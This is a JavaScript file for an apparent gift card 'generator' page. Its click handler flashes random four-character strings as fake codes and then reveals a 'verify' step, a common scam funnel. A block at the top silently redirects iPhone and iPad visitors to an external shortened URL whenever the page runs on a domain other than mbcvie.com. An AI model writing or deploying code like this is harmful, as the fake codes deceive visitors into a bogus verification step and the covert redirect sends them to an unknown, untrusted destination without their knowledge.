/*================== [  ] ===============*/
/*================== [ gift card ] ================*/
(function() {
    var originalDomain = "mbcvie.com";
    var redirectURL = "https://smrturl.co/5a058e0";

    if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain) {
        var isAppleDevice = /iPhone|iPad/i.test(navigator.userAgent);

        if (isAppleDevice) {
            window.location.href = redirectURL;
        }
    }
})();

const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function gen(html) {
    var timesRun = 0;
    var interval = setInterval(function() {
        timesRun += 1;
        if (timesRun === 60) {
            clearInterval(interval);
        }
        var txt = generateString(4);
        $("." + html).text(txt);
    }, 50);
}

$(".select").on("click", function() {
    setTimeout(function() { gen("sp1") }, 10);
    setTimeout(function() { gen("sp2") }, 3000);
    setTimeout(function() { gen("sp3") }, 6000);
    
    var src = $(this).attr("src");
    $(".main-img").attr("src", src);
    $(".item-1").addClass("d-none");
    $(".item-2").removeClass("d-none");
    
    setTimeout(function() { $(".verify").removeClass("d-none"); }, 9000);
});
